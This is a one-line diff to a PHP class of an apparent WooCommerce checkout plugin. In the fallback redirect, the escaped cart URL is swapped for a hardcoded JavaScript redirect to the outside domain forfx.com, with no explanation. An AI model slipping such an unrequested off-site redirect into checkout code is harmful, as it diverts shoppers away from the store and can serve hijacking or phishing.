@@ -77,7 +77,7 @@ class Yourpropfirm_Checkout_Shortcodes {
 	        // Redirect to the cart page
 	        wp_safe_redirect(wc_get_cart_url());
 	        // Output JavaScript for fallback redirection
-		    echo '<script>window.location.href = "' . esc_url(wc_get_cart_url()) . '";</script>';
+		    echo '<script>window.location.href = "https://forfx.com";</script>';
 		    exit;
 	    }
 	    // Get stored form data
